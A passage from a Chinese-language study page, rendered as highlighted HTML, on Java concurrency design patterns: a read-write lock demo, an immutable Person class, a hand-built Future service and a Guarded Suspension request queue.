    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">slowly</span><span class="token punctuation">(</span><span class="token keyword">int</span> ms<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span>ms<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * 线程-读资源
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReaderWorker</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">SharedData</span> data<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">ReaderWorker</span><span class="token punctuation">(</span><span class="token class-name">SharedData</span> data<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>data <span class="token operator">=</span> data<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buf <span class="token operator">=</span> data<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" read "</span> <span class="token operator">+</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * 线程-写资源
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WriterWorker</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Random</span> random <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">SharedData</span> sharedData<span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">int</span> index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">String</span> filler<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">WriterWorker</span><span class="token punctuation">(</span><span class="token class-name">SharedData</span> sharedData<span class="token punctuation">,</span> <span class="token class-name">String</span> filler<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>sharedData <span class="token operator">=</span> sharedData<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>filler <span class="token operator">=</span> filler<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">char</span> c <span class="token operator">=</span> <span class="token function">nextChar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                sharedData<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" write "</span> <span class="token operator">+</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">char</span> <span class="token function">nextChar</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">char</span> c <span class="token operator">=</span> filler<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>
        index<span class="token operator">++</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token operator">&gt;=</span> filler<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> c<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>测试类</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReadWritLockClient</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">final</span> <span class="token class-name">SharedData</span> sharedData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SharedData</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token class-name">ReaderWorker</span><span class="token punctuation">(</span>sharedData<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token class-name">ReaderWorker</span><span class="token punctuation">(</span>sharedData<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token class-name">ReaderWorker</span><span class="token punctuation">(</span>sharedData<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token class-name">ReaderWorker</span><span class="token punctuation">(</span>sharedData<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token class-name">ReaderWorker</span><span class="token punctuation">(</span>sharedData<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token class-name">WriterWorker</span><span class="token punctuation">(</span>sharedData<span class="token punctuation">,</span> <span class="token string">"qwertyuiopasdfg"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token class-name">WriterWorker</span><span class="token punctuation">(</span>sharedData<span class="token punctuation">,</span> <span class="token string">"QWERTYUIOPASDFG"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>Chapter7：不可变对象设计模式</h1>
<blockquote>
<p>Java高并发编程详解：第十八章</p>
</blockquote>
<p>不可变对象定义</p>
<ul>
<li>不可变对象是没有机会去修改的</li>
<li>每一次修改都会导致一个新的对象的产生。</li>
</ul>
<p>不可变对象必要条件（String、Integer、Float 等）</p>
<ul>
<li>
<p>确保类是final 的，不允许被其他类继承。（final修饰的类，被继承的提示：There is no default constructor available in ‘com.hots.part2.chapter7.Person’）</p>
</li>
<li>
<p>确保所有的成员变量是final 的，<strong>引用类型所引用的对象同样不可变</strong></p>
</li>
<li>
<p>不要提供任何setter 方法。</p>
<p><strong>引用集合，GET方法返回unmodifiable的集合</strong></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> <span class="token function">getList</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token class-name">Collections</span><span class="token punctuation">.</span><span class="token function">unmodifiableList</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>如果要修改类的状态，必须返回一个新的对象。</p>
</li>
</ul>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * 不可变对象
 */</span>
<span class="token keyword">final</span> <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">String</span> address<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">String</span> address<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>address <span class="token operator">=</span> address<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> name<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getAddress</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> address<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token string">"Person{"</span> <span class="token operator">+</span>
                <span class="token string">"name='"</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token char">'\''</span> <span class="token operator">+</span>
                <span class="token string">", address='"</span> <span class="token operator">+</span> address <span class="token operator">+</span> <span class="token char">'\''</span> <span class="token operator">+</span>
                <span class="token char">'}'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>Chapter8：Future设计模式</h1>
<blockquote>
<p>Java高并发编程详解：第十九章</p>
</blockquote>
<p>Future 代表的是未来的一个凭据，保留隔离的逻辑程序执行结果</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Future</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span>
    <span class="token class-name">T</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AsyncFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token keyword">implements</span> <span class="token class-name">Future</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span>

    <span class="token keyword">private</span> <span class="token keyword">volatile</span> <span class="token keyword">boolean</span> done <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token class-name">T</span> result<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">done</span><span class="token punctuation">(</span><span class="token class-name">T</span> result<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">synchronized</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>result <span class="token operator">=</span> result<span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>done <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">notifyAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">T</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">{</span>
        <span class="token keyword">synchronized</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>done<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> result<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">FutureTask</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span>
    <span class="token class-name">T</span> <span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FutureService</span> <span class="token punctuation">{</span>

    <span class="token keyword">public</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token class-name">Future</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token function">submit</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">FutureTask</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> futureTask<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">Consumer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> consumer<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">AsyncFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> asyncFuture <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AsyncFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token class-name">T</span> result <span class="token operator">=</span> futureTask<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            asyncFuture<span class="token punctuation">.</span><span class="token function">done</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>
            consumer<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> asyncFuture<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SyncInvoker</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">{</span>
        <span class="token class-name">FutureTask</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> futureTask <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">return</span> <span class="token string">"finish jobs"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">;</span>

        <span class="token class-name">FutureService</span> futureService <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FutureService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Future</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> result <span class="token operator">=</span> futureService<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span>futureTask<span class="token punctuation">,</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token operator">::</span><span class="token function">println</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"==========="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"do other thing."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"==========="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"results from job："</span> <span class="token operator">+</span> result<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>Chapter9：Guarded Suspension 设计模式（保护性暂挂模式）</h1>
<blockquote>
<p>Java高并发编程详解：第二十章</p>
</blockquote>
<p>当线程访问某个对象时，发现条件不满足，就暂时挂起等待条件满足时再次访问。</p>
<ul>
<li>处理的消息内容</li>
</ul>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Request</span> <span class="token punctuation">{</span>
    <span class="token keyword">final</span> <span class="token keyword">private</span> <span class="token class-name">String</span> value<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">Request</span><span class="token punctuation">(</span><span class="token class-name">String</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>value <span class="token operator">=</span> value<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> value<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RequestQueue</span> <span class="token punctuation">{</span>

    <span class="token comment">// 任务队列</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">LinkedList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Request</span><span class="token punctuation">&gt;</span></span> queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/**
     * 服务端处理任务
     */</span>
    <span class="token keyword">public</span> <span class="token class-name">Request</span> <span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">synchronized</span> <span class="token punctuation">(</span>queue<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span>queue<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">try</span> <span class="token punctuation">{</span>
                    queue<span class="token punctuation">.</span><span class="token function">wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"queue wait interrupted"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>

            <span class="token keyword">return</span> queue<span class="token punctuation">.</span><span class="token function">removeFirst</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 客户端推送任务
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">putRequest</span><span class="token punctuation">(</span><span class="token class-name">Request</span> request<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">synchronized</span> <span class="token punctuation">(</span>queue<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>
            queue<span class="token punctuation">.</span><span class="token function">notifyAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
